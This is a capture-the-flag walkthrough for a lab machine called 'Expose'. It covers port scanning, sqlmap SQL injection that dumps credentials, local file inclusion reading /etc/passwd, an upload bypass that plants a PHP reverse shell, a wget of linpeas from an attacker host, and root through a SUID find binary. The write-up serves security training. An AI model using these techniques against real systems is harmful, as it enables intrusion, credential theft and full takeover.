# Expose - Easy

* nmap scan - ```nmap -T4 -p- -A -Pn -v 10.10.7.213``` - reveals open ports & services:

  * 21/tcp - ftp - vsftpd 2.0.8 or later
  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  * 53/tcp - domain - ISC BIND 9.16.1 (Ubuntu Linux)
  * 1337/tcp - http - Apache httpd 2.4.41 ((Ubuntu))
  * 1883/tcp - mosquitto version 1.6.9
  * 6306/tcp - filtered - ufmp
  * 26009/tcp - filtered - unknown
  * 35119/tcp - filtered - unknown
  * 40139/tcp - filtered - unknown
  * 55281/tcp - filtered - unknown

* We can access ftp and login as anonymous, but there is nothing to be found

* On port 1337, we have a webpage that just says 'exposed'; we can try basic enumeration here:

  ```sh
  gobuster dir -u http://10.10.7.213:1337 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak -t 16 | tee expose1337.txt
  # redirect output to file because sometimes it prints too much output on terminal
  ```

* We get directories like '/admin', '/javascript' and '/phpmyadmin' - we get login portals for two of these

* We can simultaneously check with the MQTT service on port 1883 - it's a pub/sub protocol, and we can use ```mosquitto_sub``` to interact with it:

  ```sh
  mosquitto_sub -t "#" -h 10.10.7.213 -v
  # wildcard subscription - subscribes client to all unprotected topics on MQTT server
  ```

* The MQTT service does not give us anything; need to enumerate more.

* Navigating back to the '/admin' directory, it says 'is this the right admin portal?' - indicating there is another admin portal

* We can enumerate again, this time, we can use a different wordlist:

  ```sh
  gobuster dir -u http://10.10.7.213:1337 -w /usr/share/dirb/wordlists/big.txt -x txt,php,html,bak -t 16
  ```

* We get another directory '/admin_101' this time - accessing it shows that the username field is filled with '<hacker@root.thm>' on its own

* We can enumerate this subdirectory further:

  ```sh
  gobuster dir -u http://10.10.7.213:1337 -w /usr/share/dirb/wordlists/big.txt -x txt,php,html,bak -t 16
  ```

* This gives us files and folders like '/assets', '/chat.php', '/includes', '/modules', 'signup.php', and '/test'

* In '/signup.php', we can try to create an account but it does not work

* Navigating back to '/admin_101', we can try to test different inputs in login page; using a quotation mark in username field gives us the 'undefined' prompt instead of the usual 'error' one

* This could indicate a possible SQLi vulnerability - we can use ```sqlmap``` to test this further:

  ```sh
  # using Burp Suite, intercept the login attempt and save the POST request to a file

  sqlmap -r admin.req --batch --dump
  # this gives us 2 tables - config and user
  # from 'user', we get the credentials "hacker@root.thm:VeryDifficultPassword!!#@#@!#!@#1231"
  ```

* Logging in using the creds leads to '/chat.php', but we cannot interact with this it seems

* From the ```sqlmap``` dump, we also get the 'config' table contents, which includes the URL "/file1010111/index.php" with a cracked password hash for 'easytohack' - logging into this leads us to the admin dashboard for a tourism website. In this page, we get the clues for 'parameter fuzzing' and 'try file or view as GET parameters'

* We also have another URL "/upload-cv00101011/index.php" from the dump - password hint is 'name of machine user starting with letter "z"'

* Going back to the parameter fuzzing page, we can intercept a request in Burp Suite for parameters 'view' and 'file' - 'view' returns the same page as before while 'file' gives a blank page

* We can use parameter fuzzing tools for this, based on the POST request being sent:

  ```sh
  ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -X POST -d "password=easytohack" -u http://10.10.239.247:1337/file1010111/index.php?file=FUZZ
  # identify response size to be filtered

  ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -X POST -d "password=easytohack" -u http://10.10.239.247:1337/file1010111/index.php?file=FUZZ -fs 1400

  ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -X POST -d "password=easytohack" -u http://10.10.239.247:1337/file1010111/index.php?view=FUZZ -fs 1400
  ```

* We do not get anything from this, so we will have to try another approach

* Navigating back to the website, if we use ```?file=index.php``` to test for any LFI vulnerabilities, we can see that the page loads itself multiple times.

* We can try to see further and check if we are able to load any other local files

* Using the payload ```?file=../../../../etc/passwd```, we are able to read the ```/etc/passwd``` file - this also contains the name of the user starting from 'z' - 'zeamkish'

* Feeding this username in the other page "/upload-cv00101011/index.php", we get a file upload function

* Checking the source code, it runs a validation function, splits by '.' separator, and checks if it's a 'jpg' or 'png' file

* We can upload a normal '.png' file - it gets uploaded to a folder "/upload_thm_1001"

* To bypass this, we can intercept a valid upload request, and edit the filename to 'revshell.php', and forward it to the server

* The shell gets uploaded, and after we setup a listener using ```nc -nvlp 4444```, we get a reverse shell once the file is accessed:

  ```sh
  id
  # www-data

  ls /home

  ls /home/zeamkish
  # we have the user flag and ssh creds here, but we cannot read flag yet

  # get the creds
  cat /home/zeamkish/ssh_creds.txt
  ```

  ```sh
  # using the above creds
  ssh zeamkish@10.10.239.247

  cat flag.txt
  # user flag

  # for privesc, we can start by checking linpeas.sh
  # in attacker machine, host in same directory
  python3 -m http.server 8000

  # back in our victim ssh
  cd /tmp

  wget http://10.10.22.229:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh | tee check.txt
  # redirecting output to file as well for reference
  ```

* ```linpeas.sh``` shows interesting files with SUID bit set - this includes ```/usr/bin/nano``` and ```/usr/bin/find``` - we can use [GTFOBins](https://gtfobins.github.io/) to exploit this:

  ```sh
  # check for files with SUID bit set
  find / -type f -perm -04000 -ls 2>/dev/null
  # shows nano and find both

  # SUID exploit for find
  ./find . -exec /bin/sh -p \; -quit
  # this gives us root shell
  ```
